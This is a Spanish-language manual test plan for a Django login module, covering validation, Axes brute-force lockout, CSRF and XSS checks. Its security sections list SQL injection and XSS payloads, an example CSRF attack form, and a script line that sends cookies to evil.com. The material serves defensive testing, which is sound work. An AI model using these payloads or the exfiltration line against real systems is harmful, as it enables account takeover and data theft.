# 🔐 PLAN DE PRUEBAS MANUALES - MÓDULO DE LOGIN

**Fecha de creación:** 05/11/2025  
**Módulo:** Sistema de Autenticación (Login)  
**Objetivo:** Verificar la funcionalidad, seguridad y experiencia de usuario del módulo de login

---

## 📋 ÍNDICE

1. [Resumen Ejecutivo](#resumen-ejecutivo)
2. [Escenarios de Happy Path](#escenarios-de-happy-path)
3. [Escenarios de Validación de Datos](#escenarios-de-validación-de-datos)
4. [Escenarios de Seguridad](#escenarios-de-seguridad)
5. [Escenarios de Control de Acceso](#escenarios-de-control-de-acceso)
6. [Escenarios de Sesión](#escenarios-de-sesión)
7. [Escenarios de Recuperación de Contraseña](#escenarios-de-recuperación-de-contraseña)
8. [Escenarios de UI/UX](#escenarios-de-uiux)
9. [Escenarios de Rendimiento](#escenarios-de-rendimiento)
10. [Checklist de Pruebas](#checklist-de-pruebas)

---

## 🎯 RESUMEN EJECUTIVO

### Componentes del Módulo de Login

1. **Login View** (`CustomLoginView`)
   - Template: `auth/login.html`
   - Formulario: `CustomAuthenticationForm`
   - URL: `/accounts/login/`

2. **Características Principales**
   - Autenticación por email y contraseña
   - Opción "Recordarme" (7 días vs 30 días)
   - Protección contra fuerza bruta (Django Axes: 10 intentos, 15 min bloqueo)
   - Cambio forzado de contraseña en primer login
   - Redirección diferenciada para superusuarios
   - Logging detallado de eventos de seguridad

3. **Integraciones**
   - Django Axes (protección contra ataques)
   - Middlewares personalizados
   - Sistema de mensajes de Django
   - Logging estructurado

---

## ✅ ESCENARIOS DE HAPPY PATH

### HP-01: Login Exitoso - Usuario Normal✅

**Objetivo:** Verificar login exitoso con credenciales válidas

**Pre-requisitos:**
- Usuario registrado y activo
- Email: `test@example.com`
- Password: `TestPass123!`

**Pasos:**
1. Navegar a `/accounts/login/`
2. Ingresar email válido
3. Ingresar contraseña correcta
4. Hacer clic en "Iniciar Sesión"

**Resultado esperado:**
- ✅ Redirección a dashboard (`/`)
- ✅ Mensaje de bienvenida visible
- ✅ Usuario autenticado en la sesión
- ✅ Cookie de sesión creada (7 días por defecto)
- ✅ Log en sistema: `LOGIN EXITOSO | Email: test@example.com`

**Verificaciones adicionales:**
- [v ] Nombre completo del usuario visible en navbar
- [ v] Opciones de menú según rol del usuario
- [v ] Timestamp de login guardado en sesión

---

### HP-02: Login Exitoso - Con "Recordarme"✅

**Objetivo:** Verificar que la opción "Recordarme" extiende la sesión

**Pasos:**
1. Navegar a `/accounts/login/`
2. Ingresar credenciales válidas
3. ✅ **Marcar checkbox "Recordarme por 30 días"**
4. Hacer clic en "Iniciar Sesión"

**Resultado esperado:**
- ✅ Login exitoso
- ✅ Cookie de sesión con duración de **30 días** (2592000 segundos)
- ✅ Log indica: `Sesión: 30 días`

**Verificación:**
```
Inspeccionar en DevTools → Application → Cookies → sessionid
Verificar que Expires sea ~30 días desde ahora
```

---

### HP-03: Login Exitoso - Superusuario✅

**Objetivo:** Verificar redirección automática al admin panel

**Pre-requisitos:**
- Usuario con `is_superuser=True`

**Pasos:**
1. Navegar a `/accounts/login/`
2. Ingresar credenciales de superusuario
3. Hacer clic en "Iniciar Sesión"

**Resultado esperado:**
- ✅ Redirección a `/admin/` (no al dashboard)
- ✅ Mensaje: "Bienvenido al panel administrativo"
- ✅ Log nivel WARNING: `SUPERUSER LOGIN | Email: admin@example.com`
- ✅ Acceso bloqueado a rutas de la app normal

**Verificación adicional:**
- Intentar navegar manualmente a `/` → debe redirigir a `/admin/`

---

### HP-04: Login Exitoso - Org Admin✅

**Objetivo:** Verificar login de administrador de organización

**Pre-requisitos:**
- Usuario con `is_org_admin=True` y `is_superuser=False`

**Pasos:**
1. Login con credenciales de org_admin
2. Verificar dashboard

**Resultado esperado:**
- ✅ Redirección a dashboard normal
- ✅ **Dos logs generados:**
  - `LOGIN EXITOSO | Rol: Administrador`
  - `ORG_ADMIN LOGIN | Org: [nombre]` (log de seguridad adicional)
- ✅ Opciones de gestión de usuarios visibles en menú

---

### HP-05: Logout Exitoso✅

**Objetivo:** Verificar cierre de sesión correcto

**Pasos:**
1. Usuario autenticado
2. Hacer clic en "Cerrar Sesión" o navegar a `/accounts/logout/`
3. Verificar redirección

**Resultado esperado:**
- ✅ Redirección a `/accounts/login/`
- ✅ Sesión cerrada (cookie eliminada)
- ✅ Log: `LOGOUT | Email: user@example.com`
- ✅ Flags de sesión limpiados
- ✅ Mensajes pendientes eliminados

**Verificación:**
- Intentar acceder a `/` → debe redirigir a login

---

## 🔍 ESCENARIOS DE VALIDACIÓN DE DATOS

### VD-01: Email Vacío✅

**Pasos:**
1. Navegar a `/accounts/login/`
2. Dejar campo email **vacío**
3. Ingresar contraseña
4. Intentar hacer login

**Resultado esperado:**
- ✅ Validación HTML5: "Por favor, rellene este campo"
- ✅ No se envía el formulario
- ❌ No debe haber request al backend

---

### VD-02: Contraseña Vacía✅

**Pasos:**
1. Ingresar email válido
2. Dejar campo contraseña **vacío**
3. Intentar hacer login

**Resultado esperado:**
- ✅ Validación HTML5: "Por favor, rellene este campo"
- ✅ No se envía el formulario

---

### VD-03: Email con Formato Inválido✅

**Pasos:**
1. Ingresar email sin `@`: `testexample.com`
2. Ingresar contraseña
3. Intentar hacer login

**Resultado esperado:**
- ✅ Validación HTML5: "Incluya una '@' en la dirección"
- ✅ No se envía el formulario

**Casos adicionales:**
- `test@` → "Escriba una parte después de '@'"
- `@example.com` → "Escriba una parte antes de '@'"
- `test @example.com` → Error por espacio

---

### VD-04: Email No Registrado✅

**Pasos:**
1. Ingresar email válido pero **no existe en BD**: `noexiste@example.com`
2. Ingresar cualquier contraseña
3. Intentar hacer login

**Resultado esperado:**
- ❌ Login fallido
- ✅ Mensaje genérico: "Por favor, introduce un correo electrónico y contraseña válidos"
- ✅ Log WARNING: `LOGIN FALLIDO | Motivo: Email NO existe`
- ⚠️ **No debe revelar** que el email no existe (prevención de enumeración)

---

### VD-05: Contraseña Incorrecta✅

**Pasos:**
1. Ingresar email registrado: `test@example.com`
2. Ingresar contraseña incorrecta: `WrongPassword123`
3. Intentar hacer login

**Resultado esperado:**
- ❌ Login fallido
- ✅ Mensaje genérico (igual que VD-04)
- ✅ Log WARNING: `LOGIN FALLIDO | Motivo: Contraseña INCORRECTA`
- ✅ Contador de intentos de Axes incrementado

---

### VD-06: Case Sensitivity - Email✅

**Objetivo:** Verificar normalización de emails

**Pasos:**
1. Usuario registrado: `test@example.com`
2. Intentar login con: `TEST@EXAMPLE.COM`
3. Intentar login con: `TeSt@ExAmPlE.cOm`

**Resultado esperado:**
- ✅ Login exitoso en ambos casos
- ✅ Email normalizado a lowercase internamente

**Nota:** El sistema convierte emails a lowercase antes de buscar en BD

---

### VD-07: Case Sensitivity - Contraseña✅

**Pasos:**
1. Usuario con password: `MyPassword123`
2. Intentar login con: `mypassword123`

**Resultado esperado:**
- ❌ Login fallido
- ✅ Las contraseñas **SÍ son case-sensitive**

---

### VD-08: Espacios en Credenciales ✅

**Objetivo:** Verificar manejo de espacios leading/trailing

**Casos de prueba:**

| Email ingresado | Password ingresado | ¿Debe funcionar? | Resultado | Motivo |
|----------------|-------------------|------------------|-----------|--------|
| ` test@example.com` | `Password123` | ❌ No | ✅ Bloqueado por HTML5 | Validación del navegador rechaza espacios al inicio (RFC email) |
| `test@example.com ` | `Password123` | ❌ No | ✅ Bloqueado por HTML5 | Validación del navegador rechaza espacios al final |
| `test@example.com` | ` Password123` | ✅ Sí | ✅ PASS (trim backend) | Backend elimina espacios con `.strip()` |
| `test@example.com` | `Password123 ` | ✅ Sí | ✅ PASS (trim backend) | Backend elimina espacios con `.strip()` |

**Implementación - Best Practice:**

1. **Frontend (HTML5)**: 
   - `EmailField` con validación nativa del navegador
   - Rechaza automáticamente emails con espacios (` email` o `email ` son inválidos según RFC)
   - **No se envía el formulario** → mensaje "Por favor, introduce un email válido"

2. **Backend (Django)**:
   - **Email**: Método `clean_username()` usa `.strip().lower()` 
   - **Password**: Método `clean_password()` usa `.strip()`
   - **Capa de defensa adicional** por si el usuario desactiva validación HTML5
   - **UX mejorada**: Previene errores de login por espacios accidentales (copiar/pegar)

**Resultado de la prueba:**
- ✅ **Email**: HTML5 previene espacios antes de llegar al backend
- ✅ **Password**: Backend limpia espacios automáticamente (mejor UX)
- ✅ **Seguridad en capas**: Múltiples niveles de validación
- ✅ **UX apropiada**: Usuario no falla login por espacios accidentales

**Nota técnica:**
- Emails con espacios NO son válidos según RFC 5322
- Passwords con espacios leading/trailing son casos edge de UX (copiar/pegar)
- `.strip()` en password mejora experiencia sin comprometer seguridad

---

### VD-09: Caracteres Especiales en Email✅

**Objetivo:** Verificar soporte de emails válidos con caracteres especiales

**Casos válidos:**
- `user+tag@example.com`
- `user.name@example.com`
- `user_name@example.com`
- `user-name@example.com`
- `123@example.com`

**Pasos:**
1. Crear usuario con uno de estos emails
2. Intentar login
3. Debe funcionar correctamente

---

### VD-10: Inyección SQL en Campos✅

**Objetivo:** Verificar protección contra SQL injection (ataque que intenta ejecutar código SQL malicioso)

---

#### 🎯 ¿Qué es SQL Injection?

SQL Injection es un ataque donde un atacante intenta **inyectar código SQL malicioso** en los campos de entrada para:
- Bypassear la autenticación sin saber la contraseña
- Robar datos de la base de datos
- Modificar o eliminar datos (ej: `DROP TABLE users`)
- Ejecutar comandos del sistema

---

#### 🔍 Cómo Funciona el Ataque

**Ejemplo de código VULNERABLE (NO usar):**
```python
# ⚠️ PELIGROSO - Solo ejemplo educativo
query = f"SELECT * FROM users WHERE email='{email}' AND password='{password}'"
cursor.execute(query)  # SQL directo sin escapar
```

**Payload del atacante:**
```
Email: admin'--
Password: cualquier_cosa
```

**SQL generado (vulnerable):**
```sql
SELECT * FROM users WHERE email='admin'--' AND password='cualquier_cosa'
```

**¿Qué hace `--`?** Es el comentario en SQL → Todo después se ignora  
**Resultado:** `WHERE email='admin'` (¡sin validar password!) → **Atacante logueado como admin**

---

#### 🛡️ Por Qué Django es Seguro

**Tu código actual (SEGURO):**
```python
# Django ORM usa consultas parametrizadas automáticamente
User.objects.filter(email__iexact=username)
# SQL generado: SELECT * FROM users WHERE email = %s
# Parámetro: ['admin\'--']  (escapado automáticamente)
```

**Protecciones automáticas de Django:**
1. **Parametrización de consultas**: Datos separados del código SQL
2. **Escaping automático**: Caracteres especiales (`'`, `"`, `;`) se escapan
3. **Método `authenticate()`**: Usa consultas preparadas internamente

---

#### 🧪 Payloads de Prueba

**Pasos para cada payload:**
1. Ir a `/accounts/login/`
2. Ingresar el payload en el campo correspondiente
3. Intentar login
4. Verificar que falla sin causar errores

**Payload 1: `admin'--`**
```
Email: admin'--
Password: cualquier_cosa
```
**Intento del atacante:** Cerrar la cadena con `'` y comentar el resto con `--` para saltarse la contraseña  
**Resultado en tu app:**
- Django busca literalmente el email `"admin'--"`
- No existe → ✅ Login falla: `Email NO existe`
- ✅ NO se ejecuta como código SQL

---

**Payload 2: `' OR '1'='1`**
```
Email: ' OR '1'='1
Password: cualquier_cosa
```
**Intento del atacante:** Hacer que la condición WHERE siempre sea TRUE (`'1'='1'` siempre es verdadero)  
**Resultado en tu app:**
- Django trata toda la cadena como un email literal: `"' OR '1'='1"`
- No existe → ✅ Login falla
- ✅ NO se evalúa como condición SQL

---

**Payload 3: `admin'; DROP TABLE users--`**
```
Email: admin'; DROP TABLE users--
Password: cualquier_cosa
```
**Intento del atacante:** Ejecutar múltiples comandos SQL para destruir la tabla de usuarios  
**Resultado en tu app:**
- Django NO ejecuta múltiples comandos
- Busca literalmente ese email completo
- ✅ Login falla: `Email NO existe`
- ✅ **Tabla users NO se elimina**

**Verificación adicional:**
```bash
# Después de la prueba, verificar que la tabla existe:
python manage.py dbshell
SELECT COUNT(*) FROM accounts_customuser;
# Debe devolver el número de usuarios
```

---

**Payload 4: Password con `' OR '1'='1'--`**
```
Email: admin@example.com (válido)
Password: ' OR '1'='1'--
```
**Intento del atacante:** Bypassear validación de contraseña  
**Resultado en tu app:**
- Django hace hash de la password completa: `hash("' OR '1'='1'--")`
- Hash no coincide con el hash real
- ✅ Login falla: `Contraseña INCORRECTA`
- ✅ NO se ejecuta como código SQL

---

#### 📊 Tabla de Resultados Esperados

| Payload | Campo | Resultado | Log Generado | Motivo |
|---------|-------|-----------|--------------|--------|
| `admin'--` | Email | ❌ Login fallido | `Email NO existe` | Django busca email literal con `'--` |
| `' OR '1'='1` | Email | ❌ Login fallido | `Email NO existe` | Email completo no existe en BD |
| `admin'; DROP TABLE users--` | Email | ❌ Login fallido | `Email NO existe` | Django NO ejecuta múltiples comandos |
| `' OR '1'='1'--` | Password | ❌ Login fallido | `Contraseña INCORRECTA` | Hash no coincide |

**✅ NINGÚN payload debe:**
- Causar error 500
- Mostrar stack trace o mensajes de error técnicos
- Ejecutar código SQL malicioso
- Bypassear autenticación
- Modificar o eliminar datos

---

#### 🛡️ Buenas Prácticas Aplicadas

**✅ Tu app YA está protegida porque:**

1. **Uso del ORM de Django:**
   ```python
   # Archivo: arc_manager/apps/accounts/forms.py
   User.objects.filter(email__iexact=username)  # ✅ Seguro
   ```

2. **Método `authenticate()` de Django:**
   ```python
   # Django usa consultas preparadas internamente
   user = authenticate(request=self.request, username=username, password=password)
   ```

3. **Validación HTML5:**
   - `<input type="email">` rechaza muchos caracteres especiales
   - Primera capa de defensa

4. **Logging sin exponer contraseñas:**
   ```python
   logger.warning(f"LOGIN FALLIDO | Motivo: Email NO existe | Email: {username}")
   ```

---

#### 🚨 Cuándo SÍ Debes Preocuparte

**⚠️ PELIGRO si haces (NUNCA HAGAS ESTO):**
```python
# ❌ VULNERABLE:
from django.db import connection
cursor = connection.cursor()
cursor.execute(f"SELECT * FROM users WHERE email='{user_input}'")  # ❌ SQL Injection
```

**✅ SIEMPRE USA:**
```python
# ✅ CORRECTO - Parametrización:
cursor.execute("SELECT * FROM users WHERE email=%s", [user_input])

# ✅ MEJOR - ORM de Django:
User.objects.filter(email=user_input)
```

---

#### ✅ Checklist de Verificación

Después de ejecutar las pruebas, verificar:

- [ ] Payload `admin'--` → Login falla sin errores
- [ ] Payload `' OR '1'='1` → Login falla sin errores
- [ ] Payload `admin'; DROP TABLE users--` → Login falla sin errores
- [ ] Tabla `accounts_customuser` sigue existiendo en la BD
- [ ] Password con payload → Login falla sin errores
- [ ] No se generaron errores 500
- [ ] Logs muestran intentos sin exponer vulnerabilidades
- [ ] Base de datos intacta (sin modificaciones maliciosas)

---

#### 🎓 Conclusión

**Tu sistema está SEGURO contra SQL Injection porque:**
- ✅ Usas Django ORM (consultas parametrizadas automáticas)
- ✅ Usas `authenticate()` de Django (protección integrada)
- ✅ No hay SQL raw con f-strings o concatenación
- ✅ Múltiples capas de defensa (HTML5 + Backend)

**Esta prueba verifica que la protección está activa y funcionando correctamente.**

---

## 🛡️ ESCENARIOS DE SEGURIDAD ✅ 

### SEG-01: Protección Contra Fuerza Bruta ⭐

**Objetivo:** Verificar bloqueo automático por intentos fallidos excesivos (protección contra ataques de fuerza bruta)

---

#### 📋 Configuración Actual (Mejores Prácticas)

```python
# Archivo: arc_manager/core/settings.py
AXES_ENABLED = True
AXES_FAILURE_LIMIT = 10                    # Límite de intentos fallidos
AXES_COOLOFF_TIME = 0.25                   # 15 minutos de bloqueo (0.25 horas)
AXES_RESET_ON_SUCCESS = True               # Reset contador al login exitoso
AXES_LOCKOUT_BY_USER_OR_IP = True          # Bloqueo por email O IP
AXES_LOCKOUT_PARAMETERS = ['username', 'ip_address', 'user_agent']
AXES_HANDLER = 'core.axes_handler.CustomAxesHandler'  # Handler con logging
```

**¿Por qué 10 intentos y 15 minutos?**
- **10 intentos**: Balance entre seguridad y UX (no bloquea usuario legítimo con typos)
- **15 minutos**: Suficiente para frenar bots, no muy largo para usuarios reales
- **Bloqueo por email O IP**: Previene ataques con múltiples emails desde misma IP

---

#### 🧪 Pasos de la Prueba

**Escenario 1: Bloqueo por email (intentos con mismo email)**

1. Abrir `/accounts/login/`
2. Ingresar email válido: `test@example.com`
3. Ingresar contraseña **incorrecta**: `WrongPassword123`
4. Hacer clic en "Iniciar Sesión"
5. **Repetir pasos 2-4 un total de 10 veces**
6. En el **11º intento**, intentar login nuevamente

**Escenario 2: Bloqueo por IP (intentos con diferentes emails)**

1. Desde la misma IP, intentar con 5 emails diferentes
2. Hacer 2 intentos fallidos con cada email (total: 10)
3. Verificar bloqueo en el 11º intento

---

#### ✅ Resultados Esperados

**Intentos 1-10:**
- ❌ Login falla
- ✅ Mensaje genérico: "Por favor, introduce un correo electrónico y contraseña válidos"
- ✅ Log en sistema:
  ```
  WARNING: LOGIN FALLIDO | Motivo: Contraseña INCORRECTA | Email: test@example.com | IP: 192.168.1.1
  ```
- ✅ Intento 8 o 9 (cerca del límite):
  ```
  WARNING: ALERTA BLOQUEO INMINENTE | Email: test@example.com | IP: 192.168.1.1 | Intentos: 8/10
  ```

**Intento 11+ (bloqueado):**
- 🔒 Redirección a: `/accounts/login/?locked=1`
- ✅ Mensaje en pantalla: 
  > **Cuenta bloqueada temporalmente**  
  > Tu cuenta ha sido bloqueada por demasiados intentos de inicio de sesión fallidos.  
  > Por favor, espera 15 minutos o contacta con el administrador.
- ✅ **Log CRÍTICO de seguridad** (nivel WARNING):
  ```
  WARNING: 🔒 BLOQUEO POR FUERZA BRUTA | Email: test@example.com | IP: 192.168.1.1 | User-Agent: Mozilla/5.0... | Cooloff: 15 minutos
  ```

**Después de 15 minutos:**
- ✅ Bloqueo se levanta automáticamente
- ✅ Usuario puede volver a intentar login
- ✅ Contador de intentos se resetea

---

#### 🔍 Verificaciones Adicionales

**1. Verificar en Admin de Django (si tienes acceso superuser):**

```
URL: /admin/axes/accessattempt/
```

Deberías ver:
- Lista de todos los intentos fallidos
- Información: Username, IP, User-Agent, Timestamp
- Contador de intentos por usuario/IP

**2. Verificar en Logs del Sistema:**

```bash
# En desarrollo (Docker logs o logs locales)
docker-compose logs web | grep "BLOQUEO"

# O revisar archivos de log
cat logs/app.log | grep "BLOQUEO"
cat logs/security.log | grep "BLOQUEO"
```

**3. Verificar que NO se bloquea en password reset:**

```
1. Navegar a /accounts/password_reset/
2. Intentar múltiples veces con email bloqueado
```
- ✅ Password reset **NO debe bloquearse** por Axes
- ✅ Tiene su propio rate limiting (cache de 15 min)

---

#### 📊 Logs Esperados (Secuencia Completa)

```bash
# Intentos 1-7: Logs normales
WARNING: LOGIN FALLIDO | Motivo: Contraseña INCORRECTA | Email: test@example.com | IP: 172.18.0.1

# Intento 8-9: Alerta de bloqueo inminente
WARNING: ALERTA BLOQUEO INMINENTE | Email: test@example.com | IP: 172.18.0.1 | Intentos: 8/10
WARNING: ALERTA BLOQUEO INMINENTE | Email: test@example.com | IP: 172.18.0.1 | Intentos: 9/10

# Intento 10: Último intento antes del bloqueo
WARNING: LOGIN FALLIDO | Motivo: Contraseña INCORRECTA | Email: test@example.com | IP: 172.18.0.1
WARNING: ALERTA BLOQUEO INMINENTE | Email: test@example.com | IP: 172.18.0.1 | Intentos: 10/10

# Intento 11+: BLOQUEADO
WARNING: 🔒 BLOQUEO POR FUERZA BRUTA | Email: test@example.com | IP: 172.18.0.1 | User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)... | Cooloff: 15 minutos
```

---

#### 🛡️ Mejores Prácticas Implementadas

**✅ Tu configuración aplica:**

1. **Rate Limiting Agresivo:**
   - 10 intentos = suficiente para usuarios reales, insuficiente para bots

2. **Logging de Seguridad:**
   - Todos los intentos fallidos se loguean (nivel WARNING)
   - Bloqueos se loguean con emoji 🔒 para fácil detección
   - Información completa: Email, IP, User-Agent

3. **Bloqueo Dual:**
   - Por email: Previene ataques dirigidos
   - Por IP: Previene enumeración de usuarios

4. **Auto-Desbloqueo:**
   - 15 minutos es suficiente para frenar bots
   - No requiere intervención manual del admin

5. **Reset en Login Exitoso:**
   - `AXES_RESET_ON_SUCCESS = True`
   - Contador se resetea al login correcto

---

#### 🚨 Alertas para Monitoreo en Producción

En producción, deberías configurar alertas automáticas para:

```bash
# Alerta cuando hay múltiples bloqueos en corto tiempo
grep "🔒 BLOQUEO POR FUERZA BRUTA" logs/security.log | wc -l
# Si > 5 en 1 hora → Posible ataque coordinado

# Alerta cuando una IP tiene muchos intentos
grep "IP: 192.168.1.1" logs/app.log | grep "LOGIN FALLIDO" | wc -l
# Si > 50 en 1 hora → Bloquear IP en firewall

# Alerta cuando un email específico es atacado
grep "Email: admin@example.com" logs/security.log | grep "BLOQUEO" | wc -l
# Si > 10 en 1 día → Email objetivo de ataque
```

---

#### ✅ Checklist de Verificación

Después de ejecutar la prueba:

- [ ] Intento 1-10: Login falla con mensaje genérico
- [ ] Intento 8-9: Log muestra "ALERTA BLOQUEO INMINENTE"
- [ ] Intento 11: Redirección a `/accounts/login/?locked=1`
- [ ] Mensaje de cuenta bloqueada visible
- [ ] Log muestra: `🔒 BLOQUEO POR FUERZA BRUTA`
- [ ] Después de 15 min: Bloqueo se levanta
- [ ] Login exitoso resetea el contador
- [ ] Admin muestra entrada en `/admin/axes/accessattempt/`
- [ ] Bloqueo por IP también funciona (diferentes emails, misma IP)

---

#### 🎓 Conclusión

**Tu sistema implementa las mejores prácticas de protección contra fuerza bruta:**
- ✅ Django Axes configurado correctamente
- ✅ Logging completo de eventos de seguridad
- ✅ Balance entre seguridad y experiencia de usuario
- ✅ Auto-desbloqueo para evitar bloqueos permanentes
- ✅ Protección dual (email + IP)

**El log del bloqueo ES CRÍTICO y DEBE aparecer.** Si no lo ves, hay un problema con la configuración de signals.

---

### SEG-02: Bloqueo por IP✅

**Objetivo:** Verificar bloqueo por IP incluso con emails diferentes

**Configuración:**
- `AXES_LOCKOUT_BY_USER_OR_IP = True`

**Pasos:**
1. Desde misma IP, intentar login con 5 emails diferentes
2. Hacer 2 intentos fallidos con cada email (total: 10)
3. Verificar bloqueo

**Resultado esperado:**
- ✅ IP bloqueada tras 10 intentos totales
- ✅ Prevención de ataque de enumeración de usuarios

---

### SEG-03: XSS en Campos de Login

**Objetivo:** Verificar escape de HTML/JavaScript

**Payloads:**
```html
Email: <script>alert('XSS')</script>@example.com
Email: <img src=x onerror=alert('XSS')>
Password: <script>document.cookie</script>
```

**Pasos:**
1. Ingresar payload en campo email
2. Intentar login
3. Verificar mensaje de error

**Resultado esperado:**
- ✅ No se ejecuta código JavaScript
- ✅ Mensaje de error muestra el payload **escapado**: `&lt;script&gt;...`
- ✅ Django auto-escape previene XSS

---

### SEG-04: CSRF Protection✅

**Objetivo:** Verificar protección contra CSRF (Cross-Site Request Forgery)

---

#### 🎯 ¿Qué es CSRF?

CSRF (Cross-Site Request Forgery) es un ataque donde un **sitio malicioso** intenta realizar acciones en tu aplicación **usando la sesión del usuario** sin su conocimiento.

**Ejemplo de ataque:**
1. Usuario está logueado en `tuapp.com` (tiene sesión activa)
2. Usuario visita `sitio-malicioso.com`
3. Sitio malicioso tiene código oculto:
   ```html
   <form action="https://tuapp.com/accounts/login/" method="POST">
       <input name="username" value="atacante@evil.com">
       <input name="password" value="HackPass123">
   </form>
   <script>document.forms[0].submit();</script>
   ```
4. **Sin protección:** El formulario se envía usando las cookies del usuario
5. **Con protección CSRF:** Django rechaza la request con `403 Forbidden`

---

#### 🛡️ Cómo Protege Django

**1. Token CSRF en el Formulario:**
```html
<form method="POST">
    {% csrf_token %}  <!-- Django genera token único -->
    <input type="hidden" name="csrfmiddlewaretoken" value="xzxhTJ0O9FpItPtcro7yNz41zIFr0QMh...">
    <!-- Resto del formulario -->
</form>
```

**2. Validación en el Backend:**
- Django verifica que el token enviado coincida con el token en la cookie `csrftoken`
- Solo tu dominio puede leer la cookie (Same-Origin Policy del navegador)
- Sitio malicioso **NO puede leer** el token → **NO puede enviarlo**

---

#### 🔍 Por Qué el Token Visible en HTML es Seguro

**Pregunta común:** "¿No es peligroso que el token esté visible en el HTML?"

**Respuesta:** NO, es seguro por el **Same-Origin Policy (SOP)** del navegador:

```javascript
// Sitio malicioso evil.com intentando leer tu HTML:
fetch('https://tuapp.com/accounts/login/')
  .then(response => response.text())
  .then(html => {
    // 🚫 BLOQUEADO POR EL NAVEGADOR (CORS)
    // El navegador NO permite que evil.com lea el HTML de tuapp.com
  });
```

**Protección del navegador:**
- Solo `tuapp.com` puede leer su propio HTML y cookies
- Evil.com **NO puede** hacer `document.cookie` de tuapp.com
- Evil.com **NO puede** leer el contenido del iframe/fetch de tuapp.com
- **Aunque el token esté en el HTML, el atacante NO puede obtenerlo**

---

#### 🧪 Pasos de la Prueba

**Verificación 1: Token presente en formulario**

1. Navegar a `/accounts/login/`
2. Click derecho → "Inspeccionar elemento" → buscar `<form>`
3. Verificar presencia del token CSRF

**HTML esperado:**
```html
<form method="POST" action="/accounts/login/">
    <input type="hidden" name="csrfmiddlewaretoken" value="xzxhTJ0O9FpItPtcro7yNz41zIFr0QMhuaRk0wMXhurN6UoB0kE3QLtWEIzIz9">
    <!-- resto del formulario -->
</form>
```

**Verificación 2: Cookie CSRF presente**

1. Abrir DevTools → Application → Cookies
2. Buscar cookie `csrftoken`

**Cookie esperada:**
```
Name: csrftoken
Value: xzxhTJ0O9FpIt... (64 caracteres aleatorios)
HttpOnly: False (JavaScript debe poder leerlo para AJAX)
Secure: True (solo en producción con HTTPS)
SameSite: Lax
```

---

**Prueba de ataque: Intento de CSRF sin token**

**Pasos:**
1. Crear archivo `csrf_attack.html` en tu escritorio:

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Test</title>
</head>
<body>
    <h1>Testing CSRF Protection</h1>
    <p>This simulates a malicious site trying to submit a login form.</p>
    
    <form id="attackForm" action="http://localhost:8000/accounts/login/" method="POST">
        <input type="text" name="username" value="test@example.com">
        <input type="password" name="password" value="TestPass123!">
        <!-- ⚠️ NO CSRF TOKEN - Attack should fail -->
        <button type="submit">Simulate Attack</button>
    </form>
    
    <script>
        // Auto-submit for testing (comment out for manual testing)
        // document.getElementById('attackForm').submit();
    </script>
</body>
</html>
```

2. Abrir `csrf_attack.html` en tu navegador (archivo local)
3. Click en "Simulate Attack"

**Resultado esperado:**
- ❌ Request rechazado: **403 Forbidden**
- ✅ Página de error: "CSRF verification failed. Request aborted."
- ✅ Mensaje técnico (en debug): "CSRF token missing or incorrect"

---

#### ⏱️ Ciclo de Vida del Token CSRF

**Con configuración actual (Django default):**

```python
CSRF_COOKIE_AGE = None  # Expires on browser close (default)
```

**Comportamiento:**

1. **Primera visita a la página de login:**
   - Django genera token CSRF aleatorio: `xzxhTJ0O9FpItPtcro7yNz41zIFr0QMh...`
   - Lo guarda en cookie: `csrftoken`
   - Lo incluye en el HTML del formulario

2. **Durante la sesión del navegador:**
   - El **mismo token** se reutiliza para todas las requests
   - Es más eficiente (no regenerar constantemente)
   - Cookie persiste hasta cerrar el navegador

3. **Cuando cierras el navegador:**
   - Cookie `csrftoken` se elimina
   - Próxima visita → **token nuevo y diferente**

---

#### 🔐 ¿Por Qué Reutilizar el Token es Seguro?

**La seguridad NO viene de:**
- ❌ "El token cambia cada segundo"
- ❌ "El token es diferente en cada formulario"

**La seguridad SÍ viene de:**
- ✅ **Solo tu navegador conoce el token** (Same-Origin Policy)
- ✅ **Solo tu dominio puede leerlo** (cookie con domain específico)
- ✅ **El atacante NO puede adivinarlo ni robarlo**
- ✅ **El token tiene 64 caracteres aleatorios** (imposible de adivinar)

**Ejemplo:**
```
Request 1 (tu navegador): Token = ABC123...  ✅ VÁLIDO
Request 2 (tu navegador): Token = ABC123...  ✅ VÁLIDO (mismo token, OK)
Request 3 (sitio malicioso): Sin token       ❌ RECHAZADO (403 Forbidden)
Request 4 (sitio malicioso): Token = XYZ789  ❌ RECHAZADO (token incorrecto)
```

---

#### ⚙️ Configuración Actual

**En `arc_manager/core/settings.py`:**

```python
# Configuración CSRF (defaults de Django)
CSRF_COOKIE_AGE = None  # Token expira al cerrar navegador
CSRF_COOKIE_SECURE = True  # Solo enviar via HTTPS (producción)
CSRF_COOKIE_HTTPONLY = False  # JavaScript debe poder leer (para AJAX)
CSRF_COOKIE_SAMESITE = 'Lax'  # Prevenir envío cross-site

# Middleware activo
MIDDLEWARE = [
    'django.middleware.csrf.CsrfViewMiddleware',  # ✅ Protección CSRF
    # ...
]
```

**Configuración recomendada para alinear con sesión:**

```python
# Si tu sesión dura 30 días, el token CSRF también debería:
CSRF_COOKIE_AGE = 2592000  # 30 días (igual que "recordarme")
CSRF_COOKIE_HTTPONLY = True  # Protección extra contra XSS
CSRF_COOKIE_SECURE = True  # Solo HTTPS (ya configurado)
CSRF_COOKIE_SAMESITE = 'Lax'  # Ya configurado
```

---

#### 🚨 Cuándo SÍ es un Problema

**Token reutilizado ES vulnerable SI:**

1. **Hay XSS en tu aplicación:**
   ```javascript
   // Si un atacante puede inyectar código:
   <script>
   fetch('https://evil.com/steal?token=' + document.cookie);
   </script>
   ```
   **Solución:** Prevenir XSS (Django auto-escape + CSP headers) + `CSRF_COOKIE_HTTPONLY = True`

2. **No hay HTTPS en producción:**
   - Token viaja en texto plano
   - Puede ser interceptado (Man-in-the-Middle)
   **Solución:** Siempre usar HTTPS (`CSRF_COOKIE_SECURE = True`)

3. **Usuario deja sesión abierta en dispositivo compartido:**
   - Otra persona puede ver el token en DevTools
   **Solución:** Educar usuarios, auto-logout por inactividad

---

#### ✅ Resultados Esperados

**Verificaciones:**
- [✅] Token CSRF presente en formulario (`<input type="hidden" name="csrfmiddlewaretoken">`)
- [✅] Cookie `csrftoken` presente en DevTools
- [✅] Token tiene 64 caracteres alfanuméricos
- [✅] Request sin token → `403 Forbidden`
- [✅] Request desde otro dominio → Bloqueado por CORS/SOP
- [✅] Token persiste durante sesión del navegador
- [✅] Token nuevo al cerrar y reabrir navegador

---

#### 🎓 Conclusión

